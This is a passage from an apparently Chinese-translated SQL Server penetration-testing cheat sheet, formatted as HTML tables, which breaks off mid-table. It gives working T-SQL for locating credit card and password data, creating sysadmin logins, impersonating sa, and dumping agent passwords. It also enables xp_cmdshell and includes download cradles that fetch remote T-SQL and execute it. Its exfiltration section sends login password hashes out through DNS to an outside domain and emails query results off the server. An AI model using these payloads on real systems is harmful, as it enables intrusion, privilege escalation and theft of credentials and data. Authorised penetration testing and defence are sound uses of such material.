+<td align="left"><code>SELECT p.policy_id, p.name as [PolicyName], p.condition_id, c.name as [ConditionName], c.facet, c.expression as [ConditionExpression], p.root_condition_id, p.is_enabled, p.date_created, p.date_modified, p.description, p.created_by, p.is_system, t.target_set_id, t.TYPE, t.type_skeleton FROM msdb.dbo.syspolicy_policies p INNER JOIN syspolicy_conditions c ON p.condition_id = c.condition_id INNER JOIN msdb.dbo.syspolicy_target_sets t ON t.object_set_id = p.object_set_id</code></td>
+</tr>
+<tr>
+<td align="left">域用户</td>
+<td align="left"><a href="https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql" target="_blank" rel="noopener">https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql</a></td>
+</tr>
+<tr>
+<td align="left">数据库审计</td>
+<td align="left"><code>SELECT a.audit_id, a.name as audit_name, s.name as database_specification_name, d.audit_action_name, d.major_id, OBJECT_NAME(d.major_id) as object, s.is_state_enabled, d.is_group, s.create_date, s.modify_date, d.audited_result FROM sys.server_audits AS a JOIN sys.database_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.database_audit_specification_details AS d ON s.database_specification_id = d.database_specification_id</code></td>
+</tr>
+<tr>
+<td align="left">服务器审核</td>
+<td align="left"><code>SELECT audit_id, a.name as audit_name, s.name as server_specification_name, d.audit_action_name, s.is_state_enabled, d.is_group, d.audit_action_id, s.create_date, s.modify_date FROM sys.server_audits AS a JOIN sys.server_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.server_audit_specification_details AS d ON s.server_specification_id = d.server_specification_id</code></td>
+</tr>
+<tr>
+<td align="left">查询历史</td>
+<td align="left"><code>SELECT * FROM (SELECT COALESCE(OBJECT_NAME(qt.objectid),&#39;Ad-Hoc&#39;) AS objectname, qt.objectid as objectid, last_execution_time, execution_count, encrypted,&lt;br/&gt;(SELECT TOP 1 SUBSTRING(qt.TEXT,statement_start_offset / 2+1,( (CASE WHEN statement_end_offset = -1 THEN (LEN(CONVERT(NVARCHAR(MAX),qt.TEXT)) * 2)&lt;br/&gt;ELSE statement_end_offset END)- statement_start_offset) / 2+1)) AS sql_statement FROM sys.dm_exec_query_stats AS qs CROSS APPLY sys.dm_exec_sql_text(sql_handle) AS qt ) x ORDER BY execution_count DESC</code></td>
+</tr>
+<tr>
+<td align="left">启用的审核规范</td>
+<td align="left"><a href="https://gist.github.com/nullbind/5da8b5113da007ba0111" target="_blank" rel="noopener">https://gist.github.com/nullbind/5da8b5113da007ba0111</a></td>
+</tr>
+<tr>
+<td align="left">Sysadmin角色中的本地管理员</td>
+<td align="left"><code>SELECT is_srvrolemember(&#39;sysadmin&#39;,&#39;BUILTIN\Administrators&#39;)</code></td>
+</tr>
+<tr>
+<td align="left">通过数据库链接和openrowset的域用户和LDAP查询</td>
+<td align="left"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Get-SQLDomainUser-Example.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/Get-SQLDomainUser-Example.sql</a></td>
+</tr>
+</tbody></table>
+<h3 id="数据定位"><a href="#数据定位" class="headerlink" title="数据定位"></a>数据定位</h3><p>能够正确地定位和识别敏感信息可以成倍地减少在数据库中花费的时间</p>
+<table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">列出非默认数据库</td>
+<td align="left"><code>SELECT NAME FROM sysdatabases WHERE (NAME NOT LIKE &#39;distribution&#39;) AND (NAME NOT LIKE &#39;master&#39;) AND (NAME NOT LIKE &#39;model&#39;) AND (NAME NOT LIKE &#39;msdb&#39;) AND (NAME NOT LIKE &#39;publication&#39;) AND (NAME NOT LIKE &#39;reportserver&#39;) AND (NAME NOT LIKE &#39;reportservertempdb&#39;) AND (NAME NOT LIKE &#39;resource&#39;) AND (NAME NOT LIKE &#39;tempdb&#39;) ORDER BY NAME;</code></td>
+</tr>
+<tr>
+<td align="left">列出非默认表</td>
+<td align="left"><code>SELECT &#39;[&#39; + SCHEMA_NAME(t.schema_id) + &#39;].[&#39; + t.name + &#39;]&#39; AS fulltable_name, SCHEMA_NAME(t.schema_id) AS schema_name, t.name AS table_name, i.rows FROM sys.tables AS t INNER JOIN sys.sysindexes AS i ON t.object_id = i.id AND i.indid &lt; 2 WHERE (ROWS&gt; 0) AND (t.name NOT LIKE &#39;syscolumns&#39;) AND (t.name NOT LIKE &#39;syscomments&#39;) AND (t.name NOT LIKE &#39;sysconstraints&#39;) AND (t.name NOT LIKE &#39;sysdepends&#39;) AND (t.name NOT LIKE &#39;sysfilegroups&#39;) AND (t.name NOT LIKE &#39;sysfiles&#39;) AND (t.name NOT LIKE &#39;sysforeignkeys&#39;) AND (t.name NOT LIKE &#39;sysfulltextcatalogs&#39;) AND (t.name NOT LIKE &#39;sysindexes&#39;) AND (t.name NOT LIKE &#39;sysindexkeys&#39;) AND (t.name NOT LIKE &#39;sysmembers&#39;) AND (t.name NOT LIKE &#39;sysobjects&#39;) AND (t.name NOT LIKE &#39;syspermissions&#39;) AND (t.name NOT LIKE &#39;sysprotects&#39;) AND (t.name NOT LIKE &#39;sysreferences&#39;) AND (t.name NOT LIKE &#39;systypes&#39;) AND (t.name NOT LIKE &#39;sysusers&#39;) ORDER BY TABLE_NAME;</code></td>
+</tr>
+<tr>
+<td align="left">列名搜索</td>
+<td align="left"><code>SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME like &#39;%password%&#39;</code></td>
+</tr>
+<tr>
+<td align="left">列出非默认列</td>
+<td align="left"><code>SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE CHARACTER_MAXIMUM_LENGTH &gt; 14 AND DATA_TYPE NOT IN (&#39;bigint&#39;,&#39;binary&#39;,&#39;bit&#39;,&#39;cursor&#39;,&#39;date&#39;,&#39;datetime&#39;,&#39;datetime2&#39;, &#39;datetimeoffset&#39;,&#39;float&#39;,&#39;geography&#39;,&#39;hierarchyid&#39;,&#39;image&#39;,&#39;int&#39;,&#39;money&#39;,&#39;real&#39;, &#39;smalldatetime&#39;,&#39;smallint&#39;,&#39;smallmoney&#39;,&#39;sql_variant&#39;,&#39;table&#39;,&#39;time&#39;,&#39;timestamp&#39;, &#39;tinyint&#39;,&#39;uniqueidentifier&#39;,&#39;varbinary&#39;,&#39;xml&#39;) AND TABLE_NAME=&#39;CreditCard&#39; OR CHARACTER_MAXIMUM_LENGTH &lt; 1 AND DATA_TYPE NOT IN ( &#39;bigint&#39;, &#39;binary&#39;, &#39;bit&#39;, &#39;cursor&#39;, &#39;date&#39;, &#39;datetime&#39;, &#39;datetime2&#39;, &#39;datetimeoffset&#39;, &#39;float&#39;, &#39;geography&#39;, &#39;hierarchyid&#39;, &#39;image&#39;, &#39;int&#39;, &#39;money&#39;, &#39;real&#39;, &#39;smalldatetime&#39;, &#39;smallint&#39;, &#39;smallmoney&#39;, &#39;sql_variant&#39;, &#39;table&#39;, &#39;time&#39;, &#39;timestamp&#39;, &#39;tinyint&#39;, &#39;uniqueidentifier&#39;, &#39;varbinary&#39;, &#39;xml&#39;) AND TABLE_NAME=&#39;CreditCard&#39; ORDER BY COLUMN_NAME;</code></td>
+</tr>
+<tr>
+<td align="left">搜索透明加密</td>
+<td align="left"><code>SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY a.database_id WHERE is_encrypted=1</code></td>
+</tr>
+<tr>
+<td align="left">按数据库大小搜索</td>
+<td align="left"><code>SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename, (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2)) from sys.master_files where name like a.name) as [DbSizeMb] FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY DbSizeMb DESC</code></td>
+</tr>
+</tbody></table>
+<p><strong>数据定位正则表达式</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Regex</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">所有主要的信用卡提供商</td>
+<td align="left"><code>^(?:4[0-9]{12}(?:[0-9]{3})?|(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$</code></td>
+</tr>
+<tr>
+<td align="left">屏蔽的SSN</td>
+<td align="left"><code>^(\d{3}-?\d{2}-?\d{4}|XXX-XX-XXXX)$</code></td>
+</tr>
+</tbody></table>
+<h3 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">使用户成为DBA</td>
+<td align="left">EXEC master.dbo.sp_addsrvrolemember &#39;user&#39;, &#39;sysadmin&#39;;</td>
+</tr>
+<tr>
+<td align="left">授予对所有自定义对象执行</td>
+<td align="left">SELECT &#39;grant exec on &#39; + QUOTENAME(ROUTINE_SCHEMA) + &#39;.&#39; +<br>QUOTENAME(ROUTINE_NAME) + &#39; TO test&#39; FROM INFORMATION_SCHEMA.ROUTINES<br>WHERE OBJECTPROPERTY(OBJECT_ID(ROUTINE_NAME),&#39;IsMSShipped&#39;) = 0 ;</td>
+</tr>
+<tr>
+<td align="left">授予所有商店程序执行</td>
+<td align="left">CREATE ROLE db_executor<br>GRANT EXECUTE TO db_executor<br>exec sp_addrolemember &#39;db_executor&#39;, &#39;YourSecurityAccount&#39;</td>
+</tr>
+<tr>
+<td align="left">UNC路径注入</td>
+<td align="left"><a href="https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e" target="_blank" rel="noopener">https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e</a> <br><a href="https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/" target="_blank" rel="noopener">https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/</a></td>
+</tr>
+<tr>
+<td align="left">检测无法模仿的登录</td>
+<td align="left">SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#39;IMPERSONATE&#39;</td>
+</tr>
+<tr>
+<td align="left">模拟登录（注意：REVERT将使您回到原始登录状态。）</td>
+<td align="left">EXECUTE AS LOGIN = &#39;sa&#39;; SELECT @@VERSION;</td>
+</tr>
+<tr>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">创建系统管理员用户</td>
+<td align="left">USE [master]<br>GO<br>CREATE LOGIN [test] WITH PASSSWORD=N &#39;test&#39;, DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF<br>GO<br>EXEC master..sp_addsrvrolemember @loginame=N&#39;test&#39;, @rolename=N&#39;sysadmin&#39;<br>GO</td>
+</tr>
+<tr>
+<td align="left">创建系统管理员用户</td>
+<td align="left">EXEC sp_addlogin &#39;user&#39;, &#39;pass&#39;;<br>EXEC master.dbo.sp_addsrvrolemember &#39;user&#39;, &#39;sysadmin&#39;;</td>
+</tr>
+<tr>
+<td align="left">删除用户</td>
+<td align="left">EXEC sp_droplogin &#39;user&#39;;</td>
+</tr>
+<tr>
+<td align="left">检索SQL代理连接密码</td>
+<td align="left">exec msdb.dbo.sp_get_sqlagent_properties</td>
+</tr>
+<tr>
+<td align="left">检索DTS连接密码</td>
+<td align="left">select msdb.dbo.rtbldmbprops</td>
+</tr>
+<tr>
+<td align="left">获取sysadmin作为本地管理员</td>
+<td align="left"><a href="https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/</a></td>
+</tr>
+<tr>
+<td align="left">启动存储过程</td>
+<td align="left"><a href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/" target="_blank" rel="noopener">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</a></td>
+</tr>
+<tr>
+<td align="left">触发创建</td>
+<td align="left"><a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/" target="_blank" rel="noopener">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></td>
+</tr>
+<tr>
+<td align="left">Windows自动登录密码</td>
+<td align="left"><a href="https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/</a></td>
+</tr>
+<tr>
+<td align="left">xp_regwrite非系统管理员执行</td>
+<td align="left"><a href="https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e" target="_blank" rel="noopener">https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e</a></td>
+</tr>
+<tr>
+<td align="left">具有可信赖数据库的存储过程</td>
+<td align="left"><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases" target="_blank" rel="noopener">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases</a></td>
+</tr>
+<tr>
+<td align="left">存储过程用户模拟</td>
+<td align="left"><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/" target="_blank" rel="noopener">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/</a></td>
+</tr>
+<tr>
+<td align="left">默认密码</td>
+<td align="left">sa:sa <br>sa:[empty] <br>[username]:[username]</td>
+</tr>
+</tbody></table>
+<h3 id="通过SQL-Server执行OS命令"><a href="#通过SQL-Server执行OS命令" class="headerlink" title="通过SQL Server执行OS命令"></a>通过SQL Server执行OS命令</h3><table>
+<thead>
+<tr>
+<th align="left">Name</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">xp_cmdshell</td>
+<td align="left">-- Enable show advanced options <br>sp_configure &#39;show advanced options&#39;, 1 <br>RECONFIGURE <br>GO  <br><br>-- Enable xp_cmdshell sp_configure &#39;xp_cmdshell&#39;, 1 <br>RECONFIGURE <br>GO  <br><br>EXEC xp_cmdshell &#39;net user&#39;</td>
+</tr>
+<tr>
+<td align="left">写入注册表自动运行</td>
+<td align="left"><a href="https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/</a> <a href="https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e" target="_blank" rel="noopener">https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e</a></td>
+</tr>
+<tr>
+<td align="left">写入文件自动运行</td>
+<td align="left"><a href="https://blog.netspi.com/how-to-hack-database-links-in-sql-server/" target="_blank" rel="noopener">https://blog.netspi.com/how-to-hack-database-links-in-sql-server/</a></td>
+</tr>
+<tr>
+<td align="left">Agent Jobs</td>
+<td align="left"><a href="https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution" target="_blank" rel="noopener">https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution</a></td>
+</tr>
+<tr>
+<td align="left">存储过程中的SQL注入</td>
+<td align="left"><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/" target="_blank" rel="noopener">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/</a></td>
+</tr>
+<tr>
+<td align="left">CLR组装</td>
+<td align="left"><a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/" target="_blank" rel="noopener">https://blog.netspi.com/attacking-sql-server-clr-assemblies/</a></td>
+</tr>
+<tr>
+<td align="left">自定义扩展存储过程</td>
+<td align="left"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp</a></td>
+</tr>
+</tbody></table>
+<p><strong>TSQL</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">Name</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">ActiveX Javascript Agent Job</td>
+<td align="left"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql</a></td>
+</tr>
+<tr>
+<td align="left">ActiveX VBScript Agent Job</td>
+<td align="left"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql</a></td>
+</tr>
+<tr>
+<td align="left">cmdexec Agent Job</td>
+<td align="left"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql</a></td>
+</tr>
+<tr>
+<td align="left">Powershell Agent Job</td>
+<td align="left"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql</a></td>
+</tr>
+<tr>
+<td align="left">Custom Command Shell</td>
+<td align="left"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp</a></td>
+</tr>
+<tr>
+<td align="left">OLE Automation Object</td>
+<td align="left"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql</a></td>
+</tr>
+<tr>
+<td align="left">OPENROWSET</td>
+<td align="left"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql</a></td>
+</tr>
+<tr>
+<td align="left">Python</td>
+<td align="left"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql</a></td>
+</tr>
+<tr>
+<td align="left">R</td>
+<td align="left"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql</a></td>
+</tr>
+<tr>
+<td align="left">xp_cmdshell proxy</td>
+<td align="left"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql</a></td>
+</tr>
+</tbody></table>
+<h3 id="读写文件-1"><a href="#读写文件-1" class="headerlink" title="读写文件"></a>读写文件</h3><p><strong>Download Cradle bulk in server - TSQL</strong></p>
+<p>设置变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @cmd varchar(8000)</span><br></pre></td></tr></table></figure>
+
+<p>创建临时表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE #file (content nvarchar(4000));</span><br></pre></td></tr></table></figure>
+
+<p>将文件读入临时表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BULK INSERT #file FROM &apos;\\sharepoint.acme.com@SSL\Path\to\file.txt&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>选择文件内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @cmd = content FROM #file</span><br></pre></td></tr></table></figure>
+
+<p>显示命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @cmd</span><br></pre></td></tr></table></figure>
+
+<p>运行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE(@cmd)</span><br></pre></td></tr></table></figure>
+
+<p>删除临时表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE #file</span><br></pre></td></tr></table></figure>
+
+<p><strong>Download Cradle OAP 1 - TSQL</strong></p>
+<p>设置变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @url varchar(300)</span><br><span class="line">DECLARE @WinHTTP int</span><br><span class="line">DECLARE @handle int</span><br><span class="line">DECLARE @Command varchar(8000)</span><br></pre></td></tr></table></figure>
+
+<p>设置包含TSQL的目标URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET @url = &apos;http://127.0.0.1/mycmd.txt&apos;</span><br></pre></td></tr></table></figure>
+
+<p>设置命名空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC @handle=sp_OACreate &apos;WinHttp.WinHttpRequest.5.1&apos;,@WinHTTP OUT</span><br></pre></td></tr></table></figure>
+
+<p>调用Open方法以设置HTTP请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC @handle=sp_OAMethod @WinHTTP, &apos;Open&apos;,NULL,&apos;GET&apos;,@url,&apos;false&apos;</span><br></pre></td></tr></table></figure>
+
+<p>调用Send方法以发送HTTP GET请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC @handle=sp_OAMethod @WinHTTP,&apos;Send&apos;</span><br></pre></td></tr></table></figure>
+
+<p>捕获HTTP响应内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC @handle=sp_OAGetProperty @WinHTTP,&apos;ResponseText&apos;, @Command out</span><br></pre></td></tr></table></figure>
+
+<p>销毁对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC @handle=sp_OADestroy @WinHTTP</span><br></pre></td></tr></table></figure>
+
+<p>显示命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @Command</span><br></pre></td></tr></table></figure>
+
+<p><strong>Download Cradle OAP 2 - TSQL</strong></p>
+<p>设置变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @url varchar(300)</span><br><span class="line">DECLARE @WinHTTP int</span><br><span class="line">DECLARE @Handle int</span><br><span class="line">DECLARE @Command varchar(8000)</span><br></pre></td></tr></table></figure>
+
+<p>设置包含TSQL的目标URL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET @url = &apos;http://127.0.0.1/mycmd.txt&apos;</span><br></pre></td></tr></table></figure>
+
+<p>创建临时表以存储下载的字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE #text(html text NULL)</span><br></pre></td></tr></table></figure>
+
+<p>设置命名空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC @Handle=sp_OACreate &apos;WinHttp.WinHttpRequest.5.1&apos;,@WinHTTP OUT</span><br></pre></td></tr></table></figure>
+
+<p>调用Open方法以设置HTTP请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC @Handle=sp_OAMethod @WinHTTP, &apos;Open&apos;,NULL,&apos;GET&apos;,@url,&apos;false&apos;</span><br></pre></td></tr></table></figure>
+
+<p>捕获HTTP响应内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">INSERT #text(html)</span><br><span class="line">EXEC @Handle=sp_OAGetProperty @WinHTTP,&apos;ResponseText&apos;</span><br></pre></td></tr></table></figure>
+
+<p>销毁对象</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC @Handle=sp_OADestroy @WinHTTP</span><br></pre></td></tr></table></figure>
+
+<p>显示命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT @Command = html from #text</span><br><span class="line">SELECT @Command</span><br></pre></td></tr></table></figure>
+
+<p>运行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE (@Command)</span><br></pre></td></tr></table></figure>
+
+<p>删除临时表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE #text</span><br></pre></td></tr></table></figure>
+
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>横向移动使测试人员可以访问不同的功能/数据集，而这些功能/数据无需明确要求更高特权的用户。横向切换用户帐户将暴露不同的信息，并可能有助于损害特权更大的用户。</p>
+<table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">建立使用者</td>
+<td align="left">EXEC sp_addlogin &#39;user&#39;, &#39;pass&#39;;</td>
+</tr>
+<tr>
+<td align="left">删除用户</td>
+<td align="left">EXEC sp_droplogin &#39;user&#39;;</td>
+</tr>
+<tr>
+<td align="left">链接抓取</td>
+<td align="left"><a href="https://blog.netspi.com/sql-server-link-crawling-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/sql-server-link-crawling-powerupsql/</a></td>
+</tr>
+<tr>
+<td align="left">作为当前服务连接到远程数据库</td>
+<td align="left">--Requires sysadmin<br>SELECT * FROM OPENDATASOURCE(&#39;SQLNCLI&#39;, &#39;Server=MSSQLSRV04\SQLSERVER2016;Trusted_Connection=yes;&#39;).master.dbo.sysdatabases</td>
+</tr>
+</tbody></table>
+<h3 id="Data-Exfiltration"><a href="#Data-Exfiltration" class="headerlink" title="Data Exfiltration"></a>Data Exfiltration</h3><table>
+<thead>
+<tr>
+<th align="left">Description</th>
+<th align="left">Query</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">发出DNS请求</td>
+<td align="left">DECLARE @host varchar(800); <br>select @host = name + &#39;-&#39; + master.sys.fn_varbintohexstr(password_hash) + &#39;.netspi.com&#39;<br> from sys.sql_logins; exec(&#39;xp_fileexist &quot;&#39; + @host + &#39;c$boot.ini&quot;&#39;);</td>
+</tr>
+<tr>
+<td align="left">UNC路径（DNS请求）</td>
+<td align="left">xp_dirtree &#39;\data.domain.com\file&#39; <br>The UNC Path Injection Cheatsheet can be found <a href="https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet" target="_blank" rel="noopener">here</a>.</td>
+</tr>
+<tr>
+<td align="left">启用sp_send_dbmail并发送查询</td>
+<td align="left">sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;sp_configure &#39;Database Mail XPs&#39;, 1;RECONFIGURE;exec msdb..sp_send_dbmail @recipients=&#39;harold@netspi.com&#39;,@query=&#39;select @@version&#39;;</td>
+</tr>
+<tr>
+<td align="left">基本的xp_sendmail查询</td>
+<td align="left">EXEC master..xp_sendmail &#39;harold@netspi.com&#39;, &#39;This is a test.&#39;</td>
+</tr>
+<tr>
+<td align="left">使用xp_sendmail发送完整电子邮件</td>
